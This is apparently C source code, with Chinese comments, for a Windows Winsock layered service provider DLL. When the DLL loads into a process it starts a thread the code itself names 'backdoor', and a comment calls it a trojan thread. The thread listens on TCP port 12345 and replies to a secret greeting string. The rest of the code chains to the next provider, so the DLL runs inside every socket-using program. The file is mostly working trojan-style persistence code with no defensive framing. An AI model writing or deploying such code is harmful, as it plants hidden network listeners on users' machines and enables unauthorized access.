/************************************************************************/
/*  传输服务提供者都是以动态链接库的形式存在的，                        */
/************************************************************************/
#pragma data_seg("Shared")

int	dllcount=0;

#pragma data_seg()

#pragma comment (linker,"/section:Shared,rws")
#pragma comment (lib, "Ws2_32")

#define  UNICODE
#define  _UNICODE

#include <ws2spi.h>
#include <tchar.h>
#include <winsock2.h>  


GUID	filterguid = {	0xc5fabbd0,
						0x9736,
						0x11d1,
						{	0x93,
							0x7f,
							0x00,
							0xc0,
							0x4f,
							0xad,
							0x86,
							0x0d	}	};

LPWSAPROTOCOL_INFOW  protoinfo		= NULL;
WSPPROC_TABLE        nextproctable;
DWORD                protoinfosize	= 0;
HANDLE               hmutex;  
HANDLE               hthread; 
POINT                nowpt;
int                  totalprotos	= 0;

DWORD WINAPI backdoor(LPVOID)   
{
	SOCKET   sock,
			 sockt;
	WSADATA  wsa;
	int      iret = 0;
	char     msg[25];
	struct   sockaddr_in sin;

	if( WSAStartup( MAKEWORD(2,2), &wsa ) )
	{
		OutputDebugString(_T("WSAStartup Error!"));
		return 0;
	}

	sock = socket(	AF_INET,
					SOCK_STREAM,
					IPPROTO_TCP	);
	
	if( INVALID_SOCKET == sock )
	{
		OutputDebugString(_T("Socket Error!"));
		return 0;
	}

	sin.sin_addr.s_addr = htons(INADDR_ANY);
	sin.sin_family		= AF_INET;
	sin.sin_port		= htons(12345);

	if( bind( sock,(struct sockaddr *)&sin,sizeof(sin) ) == SOCKET_ERROR )
	{
		OutputDebugString(_T("Bind Error!"));
		return 0;
	}

	if( listen(sock,5) == SOCKET_ERROR )
	{
		OutputDebugString(_T("Listen Error!"));
		return 0;
	}

	while( TRUE )
	{
		sockt = accept( sock, NULL, NULL );

		if( SOCKET_ERROR == sockt )
		{
			OutputDebugString(_T("Accept Error!"));
			continue;
		}

		if((iret = recv(sockt,msg,sizeof(msg),0))==SOCKET_ERROR)
		{
			OutputDebugString(_T("Recv Error!"));
			closesocket(sockt);
			continue;
		}

		if(strstr(msg,"i am TOo2y"))
		{
			memset(msg,0,sizeof(msg));
			memcpy(msg,"i am waiting for you !",sizeof(msg)-1);

			if((iret = send(sockt,msg,sizeof(msg),0))==SOCKET_ERROR)
			{
				OutputDebugString(_T("Send Error!"));
				closesocket(sockt);
				continue;
			}
		}
		OutputDebugString(_T("Transport Successfully"));
		closesocket(sockt);
	}
	return 1;
}

BOOL getfilter()
{
	int    errorcode;

	protoinfo=NULL;
	protoinfosize=0;
	totalprotos=0;

	if(WSCEnumProtocols(NULL,protoinfo,&protoinfosize,&errorcode)==SOCKET_ERROR)
	{
		if(errorcode!=WSAENOBUFS)
		{
			OutputDebugString(_T("First WSCEnumProtocols Error!")); 
			return FALSE;
		}
	}

	if((protoinfo=(LPWSAPROTOCOL_INFOW)GlobalAlloc(GPTR,protoinfosize))==NULL)
	{
		OutputDebugString(_T("GlobalAlloc Error!"));   
		return FALSE;
	}

	if((totalprotos=WSCEnumProtocols(NULL,protoinfo,&protoinfosize,&errorcode))==SOCKET_ERROR)
	{
		OutputDebugString(_T("Second WSCEnumProtocols Error!"));  
		return FALSE;
	}

	return TRUE;
}

void freefilter()
{
	GlobalFree(protoinfo);
}

BOOL WINAPI DllMain(	HINSTANCE hmodule,
						DWORD     reason,
						LPVOID    lpreserved	)
{
	TCHAR   processname[MAX_PATH];
	TCHAR   showmessage[MAX_PATH + 25];

	switch( reason )
	{
		case DLL_PROCESS_ATTACH:
		{
			//获得调用本服务提供者动态链接库的可执行文件的全名
			GetModuleFileName( NULL, processname, MAX_PATH );

			_tcscpy(showmessage,processname);

			_tcscat(showmessage,_T(" Loading my dll ..."));

			OutputDebugString(showmessage);

			hmutex = CreateMutex(NULL,FALSE,NULL);

			WaitForSingleObject(hmutex,INFINITE);

			dllcount++;

			if( 1 == dllcount )
			{
				OutputDebugString(_T("Start the backdoor ..."));

				//创建木马线程，它只是展示数据的流通
				hthread = CreateThread(	NULL,
										0,
										backdoor,
										NULL,
										0,
										NULL		);
			}
			
			ReleaseMutex(hmutex);
			
			break;
		}
		case DLL_PROCESS_DETACH:
		{
			WaitForSingleObject(hmutex,INFINITE);

			dllcount--;

			if( 0 == dllcount )
			{
				CloseHandle(hthread);
			}

			ReleaseMutex(hmutex);

			CloseHandle(hthread);

			break;
		}
	}
	return TRUE;
}


// 传输服务提供者只有一个入口函数就是WSPStartup，它是Windows Socket 应用程序调用SPI的
// 初始化函数
int WSPAPI WSPStartup(	WORD				wversionrequested,
						LPWSPDATA			lpwspdata,
						LPWSAPROTOCOL_INFOW	lpprotoinfo,
						WSPUPCALLTABLE		upcalltable,				///// 其他SPI函数的调用都是通过WSPStartup的参数WSPUPCALLTABLE来实现的
						LPWSPPROC_TABLE		lpproctable				)
{
	int           i;
	int			  nStatus;
	int           errorcode;
	int           filterpathlen;
	DWORD		  dwStatus;
	DWORD         layerid = 0;
	DWORD         nextlayerid = 0;
	TCHAR         * filterpath;
	HINSTANCE     hfilter;
	LPWSPSTARTUP  wspstartupfunc=NULL;

	if( lpprotoinfo->ProtocolChain.ChainLen <= 1 )
	{
		OutputDebugString(_T("ChainLen<=1"));    
		return FALSE;
	}
 
	getfilter();

	for(i=0;i<totalprotos;i++)
	{
		if(memcmp(&protoinfo[i].ProviderId,&filterguid,sizeof(GUID))==0)
		{
			//获得已安装自定义IP分层协议的由Ws2_32.dll分配的唯一标志
			layerid = protoinfo[i].dwCatalogEntryId;
			break;
		}
	}

	for(i=0;i<lpprotoinfo->ProtocolChain.ChainLen;i++)
	{
		if(lpprotoinfo->ProtocolChain.ChainEntries[i]==layerid)
		{
			////获得下一层传输服务提供者的标志信息
			nextlayerid = lpprotoinfo->ProtocolChain.ChainEntries[i+1];
			break;
		}
	}

	filterpathlen=MAX_PATH;
	filterpath=(TCHAR*)GlobalAlloc(GPTR,filterpathlen);  
	for(i=0;i<totalprotos;i++)
	{
		if(nextlayerid==protoinfo[i].dwCatalogEntryId)
		{
			//获得下一层传输服务提供者的安装路径
			nStatus = WSCGetProviderPath(	&protoinfo[i].ProviderId,
											filterpath,
											&filterpathlen,
											&errorcode					);

			if( SOCKET_ERROR == nStatus )
			{
				OutputDebugString(_T("WSCGetProviderPath Error!")); 
				return WSAEPROVIDERFAILEDINIT;
			}
			break;
		}
	}
	//扩展环境变量
	dwStatus = ExpandEnvironmentStrings(filterpath,filterpath,MAX_PATH);

	if( !dwStatus )
	{
		OutputDebugString(_T("ExpandEnvironmentStrings Error!"));  
		return WSAEPROVIDERFAILEDINIT;
	}

	//装载下一层传输服务提供者
	hfilter = LoadLibrary(filterpath);

	if( NULL == hfilter )
	{
		OutputDebugString(_T("LoadLibrary Error!"));
		return WSAEPROVIDERFAILEDINIT;
	}

	//获得下一层传输服务提供者的入口函数WSPStartup,以便调用
	wspstartupfunc = (LPWSPSTARTUP)GetProcAddress(hfilter,"WSPStartup");
	
	if( NULL == wspstartupfunc )
	{
		OutputDebugString(_T("GetProcessAddress Error!"));
		return WSAEPROVIDERFAILEDINIT;
	}

	//调用下一层传输服务提供者的WSPStartup函数，实现钩子功能
	errorcode = wspstartupfunc(	wversionrequested,
								lpwspdata,
								lpprotoinfo,
								upcalltable,
								lpproctable			);

	if( ERROR_SUCCESS != errorcode )
	{
		OutputDebugString(_T("wspstartupfunc Error!")); 
		return errorcode;
	}

	//保存下一层服务提供者的30个服务函数指针
	nextproctable = *lpproctable;

	freefilter();
	
	return 0;
}